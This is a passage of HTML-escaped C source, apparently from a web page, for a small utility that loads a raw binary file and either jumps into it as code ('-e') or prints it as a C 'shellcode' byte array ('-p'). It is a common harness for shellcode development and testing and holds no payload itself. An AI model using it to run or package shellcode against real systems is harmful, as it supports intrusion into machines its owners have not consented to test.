&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l;
&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; m = 15; /* max # of bytes to print on one line */

&nbsp;&nbsp;&nbsp; struct stat sbuf;
&nbsp;&nbsp;&nbsp; long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flen;&nbsp;&nbsp; /* Note: assume files are &lt; 2**32 bytes long ;-) */
&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (*fptr)(void);

&nbsp;&nbsp;&nbsp; if(argc &lt; 3) usage(argv[0]);
&nbsp;&nbsp;&nbsp; if(stat(argv[2], &amp;sbuf)) barf("failed to stat file");
&nbsp;&nbsp;&nbsp; flen = (long) sbuf.st_size;
&nbsp;&nbsp;&nbsp; if(!(code = malloc(flen))) barf("failed to grab required memeory");
&nbsp;&nbsp;&nbsp; if(!(fp = fopen(argv[2], "rb"))) barf("failed to open file");
&nbsp;&nbsp;&nbsp; if(fread(code, 1, flen, fp) != flen) barf("failed to slurp file");
&nbsp;&nbsp;&nbsp; if(fclose(fp)) barf("failed to close file");
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; while ((arg = getopt (argc, argv, "e:p:")) != -1){&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (arg){&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'e':&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; croak("Calling code ...");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fptr = (void (*)(void)) code;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (*fptr)();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'p':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\n\nchar shellcode[] =\n");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l = m;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; flen; ++i) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(l &gt;= m) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(i) printf("\"\n");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf( "\t\"");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l = 0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ++l;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\\x%02x", ((unsigned char *)code)[i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\";\n\n\n");
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage(argv[0]);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;
&nbsp;&nbsp;&nbsp; }&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; return 0;
}



</pre>



</body></html>